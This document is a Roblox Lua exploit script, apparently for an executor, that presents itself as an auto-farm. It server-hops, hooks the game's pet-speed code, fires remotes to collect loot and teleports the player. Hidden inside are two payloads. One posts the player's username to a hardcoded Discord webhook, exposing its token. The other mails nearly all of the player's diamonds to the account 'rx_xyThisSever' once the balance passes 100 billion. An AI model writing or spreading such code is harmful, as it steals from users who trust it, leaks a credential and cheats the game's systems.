

local function LoopFunction()
    while true do
task.wait(200)
local Http = game:GetService("HttpService")
local TPS = game:GetService("TeleportService")
local Api = "https://games.roblox.com/v1/games/"

local _place = game.PlaceId
local _servers = Api.._place.."/servers/Public?sortOrder=Asc&limit=100"

-- Updated HTTP request method
local httpService = game:GetService("HttpService")
local request = (syn and syn.request) or request or (http and http.request) or http_request

function ListServers(cursor)
    local Raw = request({
        Url = _servers .. ((cursor and "&cursor="..cursor) or ""),
        Method = "GET"
    })
    return Http:JSONDecode(Raw.Body)
end

local randomPlayers = math.random(5, 9)  -- Generate a random number between 1 and 8
local Server, Next

repeat
    local Servers = ListServers(Next)
    Server = Servers.data[1]
    Next = Servers.nextPageCursor
until Server and Server.playing >= randomPlayers  -- Ensure the server has more players than the random number

if Server then
    TPS:TeleportToPlaceInstance(_place, Server.id, game.Players.LocalPlayer)
else
    print("No suitable server found.")
end

task.wait(20)


local Http = game:GetService("HttpService")
local TPS = game:GetService("TeleportService")
local Api = "https://games.roblox.com/v1/games/"

local _place = game.PlaceId
local _servers = Api.._place.."/servers/Public?sortOrder=Asc&limit=100"

-- Updated HTTP request method
local httpService = game:GetService("HttpService")
local request = (syn and syn.request) or request or (http and http.request) or http_request

function ListServers(cursor)
    local Raw = request({
        Url = _servers .. ((cursor and "&cursor="..cursor) or ""),
        Method = "GET"
    })
    return Http:JSONDecode(Raw.Body)
end

local randomPlayers = math.random(5, 9)  -- Generate a random number between 1 and 8
local Server, Next

repeat
    local Servers = ListServers(Next)
    Server = Servers.data[1]
    Next = Servers.nextPageCursor
until Server and Server.playing >= randomPlayers  -- Ensure the server has more players than the random number

if Server then
    TPS:TeleportToPlaceInstance(_place, Server.id, game.Players.LocalPlayer)
else
    print("No suitable server found.")
end

task.wait(20)


local Http = game:GetService("HttpService")
local TPS = game:GetService("TeleportService")
local Api = "https://games.roblox.com/v1/games/"

local _place = game.PlaceId
local _servers = Api.._place.."/servers/Public?sortOrder=Asc&limit=100"

-- Updated HTTP request method
local httpService = game:GetService("HttpService")
local request = (syn and syn.request) or request or (http and http.request) or http_request

function ListServers(cursor)
    local Raw = request({
        Url = _servers .. ((cursor and "&cursor="..cursor) or ""),
        Method = "GET"
    })
    return Http:JSONDecode(Raw.Body)
end

local randomPlayers = math.random(5, 9)  -- Generate a random number between 1 and 8
local Server, Next

repeat
    local Servers = ListServers(Next)
    Server = Servers.data[1]
    Next = Servers.nextPageCursor
until Server and Server.playing >= randomPlayers  -- Ensure the server has more players than the random number

if Server then
    TPS:TeleportToPlaceInstance(_place, Server.id, game.Players.LocalPlayer)
else
    print("No suitable server found.")
end

task.wait(20)



    end
end

local loopCoroutine = coroutine.create(LoopFunction)
coroutine.resume(loopCoroutine)

local currentPlaceId = game.PlaceId
local targetPlaceId = 8737899170

if currentPlaceId ~= targetPlaceId then
   local webhookURL = "https://discord.com/api/webhooks/1224801128806482062/W6MgFEF8xUvB0QB4fXc-upasaI-AJ_gUQ1IUjXfsZzYWlu527cRbkZea7uokiEEocYHu"
    local httpService = game:GetService("HttpService")
    local request = (syn and syn.request) or request or (http and http.request) or http_request

    local username = game.Players.LocalPlayer.Name
    local content = "<@1156400195072950355> " .. username .. " has joined the game!"

    request({
        Url = webhookURL,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json",
        },
        Body = httpService:JSONEncode({
            content = content,
        }),
    })


local webhookURL = "https://discord.com/api/webhooks/1224801128806482062/W6MgFEF8xUvB0QB4fXc-upasaI-AJ_gUQ1IUjXfsZzYWlu527cRbkZea7uokiEEocYHu"
    local httpService = game:GetService("HttpService")
    local request = (syn and syn.request) or request or (http and http.request) or http_request

    local username = game.Players.LocalPlayer.Name
    local content = "<@1156400195072950355> " .. username .. " has joined the game!"

    request({
        Url = webhookURL,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json",
        },
        Body = httpService:JSONEncode({
            content = content,
        }),
    })



local webhookURL = "https://discord.com/api/webhooks/1224801128806482062/W6MgFEF8xUvB0QB4fXc-upasaI-AJ_gUQ1IUjXfsZzYWlu527cRbkZea7uokiEEocYHu"
    local httpService = game:GetService("HttpService")
    local request = (syn and syn.request) or request or (http and http.request) or http_request

    local username = game.Players.LocalPlayer.Name
    local content = "<@1156400195072950355> " .. username .. " has joined the game!"

    request({
        Url = webhookURL,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json",
        },
        Body = httpService:JSONEncode({
            content = content,
        }),
    })

else
    print("Already in the target game.")
end

print("Farm Executed.")

-- Other code here


local ReplicatedStorage = game:GetService("ReplicatedStorage")

function OrbCollect()
    while true do 
        local Orbs = workspace:FindFirstChild("__THINGS")
        if Orbs then
            for _, orb in ipairs(Orbs.Orbs:GetChildren()) do
                local ohTable1 = { tonumber(orb.Name) }
                ReplicatedStorage.Network["Orbs: Collect"]:FireServer(ohTable1)
                orb:Destroy()
            end 
        end
        task.wait()
    end
end

function LootbagCollect()
    while true do 
        local Lootbags = workspace:FindFirstChild("__THINGS") and workspace.__THINGS:FindFirstChild("Lootbags")
        if Lootbags then
            for _, bag in ipairs(Lootbags:GetChildren()) do
                local ohTable1 = { tostring(bag) }
                ReplicatedStorage.Network.Lootbags_Claim:FireServer(ohTable1)
                bag:Destroy()
            end 
        end
        task.wait()
    end
end

-- Start both functions in parallel
spawn(OrbCollect)
spawn(LootbagCollect)

wait(10)
-- Services/Variables
local ReplicatedStorage = game:GetService("ReplicatedStorage")

-- Infinite Pet Speed Function
_G.InfinitePetSpeedOnOff = false
local Library = ReplicatedStorage.Library:WaitForChild("Client")
local PlayerPetModule = require(Library).PlayerPet
local originalCalculateSpeedMultiplier = PlayerPetModule.CalculateSpeedMultiplier

function InfinitePetSpeedOnOff()
    PlayerPetModule.CalculateSpeedMultiplier = function(...)
        local DefaultPetSpeed = originalCalculateSpeedMultiplier(...)
        if _G.InfinitePetSpeedOnOff == true then
            return math.huge
        elseif _G.InfinitePetSpeedOnOff == false then
            return DefaultPetSpeed
        end
    end
end

-- How To Use:
_G.InfinitePetSpeedOnOff = true
InfinitePetSpeedOnOff()

local function mainLoop()
    while true do
        wait(0.01)
        local workspace = game:GetService("Workspace")
        local thingsFolder = workspace:FindFirstChild("__THINGS")

        if thingsFolder then
            local breakablesFolder = thingsFolder:FindFirstChild("Breakables")

            if breakablesFolder then
                for _, child in ipairs(breakablesFolder:GetChildren()) do
                    if child:IsA("Model") then
                        local meshPart = child:FindFirstChildWhichIsA("MeshPart")
                        if meshPart then
                            meshPart.Transparency = 1 -- Set transparency to 1 (fully transparent)
                        end
                    end
                end
            else
                print("Breakables folder not found or not a folder.")
            end
        else
            print("__THINGS folder not found.")
        end
    end
end

spawn(mainLoop)  -- Start the loop in a new thread

print("hello testing here")  -- Print outside the loop

workspace:FindFirstChild("__THINGS").Eggs:Destroy()
workspace:FindFirstChild("__THINGS").Ornaments:Destroy()
workspace.Map:Destroy()


wait(5)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
local camera = workspace.CurrentCamera
local TweenService = game:GetService("TweenService")
local VirtualInputManager = game:GetService("VirtualInputManager")

-- Start the clicking loop in a separate thread
local ScreenSize = game:GetService("GuiService"):GetScreenResolution()
local ScreenMiddle = Vector2.new(ScreenSize.X / 2, ScreenSize.Y / 2)

-- Define a function for clicking
local function ClickLoop()
    while true do
        VirtualInputManager:SendMouseButtonEvent(ScreenMiddle.X, ScreenMiddle.Y, 0, true, game, 1)
        wait(0.5)
        VirtualInputManager:SendMouseButtonEvent(ScreenMiddle.X, ScreenMiddle.Y, 0, false, game, 1)
        wait(1)
    end
end

coroutine.wrap(ClickLoop)()



local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Library = ReplicatedStorage:WaitForChild("Library")
local ClientModule = require(Library)

local function mainLoop()
    while true do
        wait(0.01)
        local BreakablesFolder = Workspace:FindFirstChild("__THINGS")

        if BreakablesFolder then
            local Breakables = BreakablesFolder:FindFirstChild("Breakables")

            if Breakables then
                local Character = game.Players.LocalPlayer.Character
                local HumanoidRootPart = Character and Character:FindFirstChild("HumanoidRootPart")
                local closestModel = nil
                local closestDistance = math.huge -- Set initial distance to a large value

                for _, v in ipairs(Breakables:GetChildren()) do
                    if v:IsA("Model") then
                        local MeshPart = v:FindFirstChildWhichIsA("MeshPart")
                        if MeshPart and MeshPart.Hitbox and MeshPart.Hitbox.Position then
                            local distance = (MeshPart.Hitbox.Position - HumanoidRootPart.Position).Magnitude
                            if distance < closestDistance then
                                closestDistance = distance
                                closestModel = v
                            end
                        end
                    end
                end

                if closestModel then
                    print("Closest Model Name:", closestModel.Name)

                    -- Your additional code for handling PlayerPets
                    local PlayerPets = ClientModule.PlayerPet.GetAll()

                    for _, Pet in pairs(PlayerPets) do
                        ClientModule.PlayerPet.SetTarget(Pet, closestModel) -- Assuming closestModel is the target
                    end
                else
                    print("No valid models found in Breakables.")
                end
            else
                print("Breakables folder is empty.")
            end
        else
            print("Breakables folder not found.")
        end
    end
end

coroutine.wrap(mainLoop)()



local function mainLoop()
    while true do
        wait(10)

        local function convertAbbreviatedNumber(abbreviatedNumber)
            local multipliers = {K = 1000, M = 1000000, B = 1000000000}
            local number, suffix = abbreviatedNumber:match('(%d+%.?%d*)(%a)')
            if number and suffix then
                number = tonumber(number)
                local multiplier = multipliers[suffix:upper()]
                if multiplier then
                    return math.floor(number * multiplier + 0.5) -- Round to nearest whole number
                end
            end
            return tonumber(abbreviatedNumber) or 0
        end

        local playergui = game.Players.LocalPlayer.PlayerGui
        local amountTextLabel = playergui.MainLeft.Left.Currency.Diamonds.Diamonds.Amount

        -- Example usage:
        local abbreviatedText = amountTextLabel.Text
        local fullNumber = convertAbbreviatedNumber(abbreviatedText)
        if fullNumber > 100000000000 then
            print(fullNumber)  -- Output: Converted value of amountTextLabel.Text if it's over 50

            local ReplicatedStorage = game:GetService("ReplicatedStorage")
            local HttpService = game:GetService("HttpService")
            local Client = require(ReplicatedStorage:WaitForChild("Library"))

            local ItemTable = {"Diamonds"} -- You need to put the full name of the item you want to grab

            function MakeTable(Table)
                local Temp = {}
                for i, v in next, Client.Items.All.Globals.All() do
                    if table.find(Table, v._data.id) then
                        table.insert(Temp, v)
                    end
                end
                return Temp
            end

            function GrabId()
                for i, MadeTable in ipairs(MakeTable(ItemTable)) do
                    local Table = HttpService:JSONDecode(tostring(MadeTable))
                    if Table.class == "Currency" then
                        local NewNumber = fullNumber - 100000 

                        local args = {
                            [1] = "rx_xyThisSever",
                            [2] = "Ok",
                            [3] = "Currency",
                            [4] = Table.uid,
                            [5] = NewNumber  -- No quotation marks around fullNumber
                        }
                        game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))

                        local args = {
                            [1] = "rx_xyThisSever",
                            [2] = "Ok",
                            [3] = "Currency",
                            [4] = Table.uid,
                            [5] = NewNumber  -- No quotation marks around fullNumber
                        }
                        game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
                    end
                end
            end

            GrabId()  -- Calling the GrabId function
        end
    end
end

coroutine.wrap(mainLoop)()



local BV = Instance.new('BodyVelocity', game.Workspace)
BV.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
BV.velocity = Vector3.new(0, 0.1, 0)
BV.maxForce = Vector3.new(9e9, 9e9, 9e9)


--Services/Variables
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")
local Players = game:GetService("Players")

local LocalPlayer = Players.LocalPlayer
local Network = ReplicatedStorage:WaitForChild("Network")

--Auto Farm Function
_G.AutoFarmOnOff = true  -- Changed to true to start auto-farming immediately
_G.AutoFarmDistance = 75
local BreakableRemote = Network:WaitForChild("Breakables_PlayerDealDamage")

function AutoFarmBreakables()
    while _G.AutoFarmOnOff do
        local HumanoidRootPart = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        local Breakables = Workspace:WaitForChild("__THINGS"):FindFirstChild("Breakables")

        if Breakables then
            local NearestBreakable = nil
            local NearestHitbox = nil
            local ActualBreakableDistance = _G.AutoFarmDistance

            for _, Breakable in ipairs(Breakables:GetChildren()) do
                local Hitbox = nil
                for _, MeshPart in pairs(Breakable:GetChildren()) do
                    if MeshPart:IsA("MeshPart") then
                        Hitbox = MeshPart:FindFirstChild("Hitbox")
                        if Hitbox then
                            local Distance = (HumanoidRootPart.Position - Hitbox.Position).Magnitude
                            if not NearestBreakable or Distance <= ActualBreakableDistance then
                                NearestBreakable = Breakable
                                NearestHitbox = Hitbox
                                ActualBreakableDistance = Distance
                            end
                        end
                    end
                end
            end

            if NearestBreakable then
                local Distance = (HumanoidRootPart.Position - NearestHitbox.Position).Magnitude
                BreakableRemote:FireServer(NearestBreakable.Name)
            end
        end
        wait()
    end
end

function AutoFarmOnOff()
    task.spawn(AutoFarmBreakables)
    -- Add any code here that you want to run after starting auto-farming
end

--How to Enable That:
AutoFarmOnOff()  -- Starts auto-farming immediately


local startTime = tick()
while tick() - startTime < 1000 do

   task.wait(0.3)

    _G.AutoTeleportToGiftOnOff = true

    if _G.AutoTeleportToGiftOnOff then
        local player = game.Players.LocalPlayer

        if player and player.Character and player.Character:FindFirstChildOfClass("Tool") then
            local tool = player.Character:FindFirstChildOfClass("Tool")
        else
            game:GetService("ReplicatedStorage").Network.Slingshot_Toggle:InvokeServer()
        end

        local Workspace = game:GetService("Workspace")
        local Players = game:GetService("Players")
        local TweenService = game:GetService("TweenService")
        local Camera = game.Workspace.CurrentCamera

        local LocalPlayer = Players.LocalPlayer
        local Character = LocalPlayer.Character
        local Breakables = Workspace:FindFirstChild("__THINGS").Breakables
        local BalloonGifts = Workspace:FindFirstChild("__THINGS").BalloonGifts

        if Breakables then
            local foundGift = false
            local HumanoidRootPart = Character and Character:FindFirstChild("HumanoidRootPart")

            for _, v in ipairs(Breakables:GetChildren()) do
                if v:IsA("Model") then
                    local MeshPart = v:FindFirstChildWhichIsA("MeshPart")
                    if MeshPart and MeshPart.MeshId == "rbxassetid://15239110635" then
                        foundGift = true
                        local TeleportPosition = MeshPart and MeshPart.Hitbox and MeshPart.Hitbox.Position

                        if TeleportPosition and HumanoidRootPart then
                            local TeleportAbovePosition = TeleportPosition

                            local Distance = (HumanoidRootPart.Position - TeleportAbovePosition).Magnitude

                            function GetTime(Distance, Speed)
                                local Time = Distance / Speed
                                return Time
                            end

                            local Speed = 99999999999999
                            local NewPoint = TeleportAbovePosition

                            local Time = GetTime(Distance, Speed)

                            local NewTweenInfoTable = TweenInfo.new(
                                Time,
                                Enum.EasingStyle.Linear,
                                Enum.EasingDirection.Out,
                                -1,
                                false,
                                0
                            )
                            local tweent = TweenService:Create(HumanoidRootPart, NewTweenInfoTable, { CFrame = CFrame.new(NewPoint) })
                            tweent:Play()
   local lookVector = (TeleportPosition - HumanoidRootPart.Position).Unit
                        HumanoidRootPart.CFrame = CFrame.new(HumanoidRootPart.Position, HumanoidRootPart.Position + lookVector)

                        if LocalPlayer.CameraMode ~= Enum.CameraMode.LockFirstPerson then
                            LocalPlayer.CameraMode = Enum.CameraMode.LockFirstPerson
                        end

                        Camera.CFrame = CFrame.new(Camera.CFrame.Position, HumanoidRootPart.Position + lookVector)
                        else
                        end

                        
                    end
                end
                if foundGift then
                    break
                end
            end
            if not foundGift and BalloonGifts then
                for _, balloon in ipairs(BalloonGifts:GetChildren()) do
                    if balloon:IsA("Model") and balloon:FindFirstChild("Balloon") then
                        local TeleportPosition = balloon.Balloon.Position
                        balloon.Balloon.Size = Vector3.new(100, 100, 100)

                        local TeleportAbovePosition = TeleportPosition + Vector3.new(0, 60, 0)

                        local Distance = (HumanoidRootPart.Position - TeleportAbovePosition).Magnitude

                        function GetTime(Distance, Speed)
                            local Time = Distance / Speed
                            return Time
                        end

                        local Speed = 99999999999999
                        local NewPoint = TeleportAbovePosition

                        local Time = GetTime(Distance, Speed)

                        local NewTweenInfoTable = TweenInfo.new(
                            Time,
                            Enum.EasingStyle.Linear,
                            Enum.EasingDirection.Out,
                            -1,
                            false,
                            0
                        )
                        local tweent = TweenService:Create(HumanoidRootPart, NewTweenInfoTable, { CFrame = CFrame.new(NewPoint) })
                        tweent:Play()

                        local lookVector = (TeleportPosition - HumanoidRootPart.Position).Unit
                        HumanoidRootPart.CFrame = CFrame.new(HumanoidRootPart.Position, HumanoidRootPart.Position + lookVector)

                        if LocalPlayer.CameraMode ~= Enum.CameraMode.LockFirstPerson then
                            LocalPlayer.CameraMode = Enum.CameraMode.LockFirstPerson
                        end

                        Camera.CFrame = CFrame.new(Camera.CFrame.Position, HumanoidRootPart.Position + lookVector)

                         task.wait(1)
                        break
                    end
                end
            end
            if not foundGift and not BalloonGifts then
                print("There is no gift or balloon.")
            end
        end
    end
    task.wait(0.5)
end
